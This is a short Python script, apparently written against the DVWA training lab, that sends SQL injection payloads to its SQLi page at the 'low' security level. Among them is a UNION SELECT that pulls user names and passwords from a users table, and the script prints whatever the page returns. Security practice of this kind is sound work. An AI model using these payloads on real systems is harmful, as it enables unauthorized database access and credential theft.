#!/usr/bin/env python3

import requests
import urllib3
from bs4 import BeautifulSoup

from util import http_get

PAYLOADS = [
    "' OR 1=1 # ",
    "'",
    "' UNION SELECT first_name, password FROM users # ",
]

# -----------------------

def sqli_low(base_url):
    global PAYLOADS

    print("==================================")
    print("[INFO] - SQLi low")
    
    url = base_url + "/vulnerabilities/sqli/"
    for payload in PAYLOADS:
        params = {"id": payload, "Submit": "Submit"}
        r = http_get(url, "low", params=params)
        soup = BeautifulSoup(r.text, "html.parser")
        div = soup.find("div", {"class": "vulnerable_code_area"})

        if div:
            print("----------------------------------")
            print(f"[SUCCESS]")
            print(f"payload = !{payload}!")

            for elem in div.find_all("pre"):
                print(elem)
